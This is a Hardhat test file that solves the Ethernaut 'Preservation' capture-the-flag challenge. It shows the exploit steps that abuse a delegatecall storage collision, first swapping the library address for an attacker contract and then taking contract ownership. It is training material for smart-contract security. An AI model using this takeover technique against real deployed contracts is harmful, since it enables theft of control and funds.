import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Preservation} from '../../types/typechain';

describe('Ethernaut 16: Preservation', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Preservation;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    const libraryContract1 = await ethers.getContractFactory('LibraryContract', owner).then(f => f.deploy());
    const libraryContract2 = await ethers.getContractFactory('LibraryContract', owner).then(f => f.deploy());
    contract = await ethers
      .getContractFactory('Preservation', owner)
      .then(f => f.deploy(libraryContract1.address, libraryContract2.address));
    await contract.deployed();
  });

  it('should claim ownership', async () => {
    const attackerContract = await ethers.getContractFactory('PreservationAttacker', attacker).then(f => f.deploy());
    await attackerContract.deployed();

    // set library address
    await contract.connect(attacker).setFirstTime(attackerContract.address);

    // pwn
    await contract.connect(attacker).setFirstTime('0xDEADBEEF'); // dummy argument
  });

  after(async () => {
    expect(await contract.owner()).to.eq(attacker.address);
  });
});
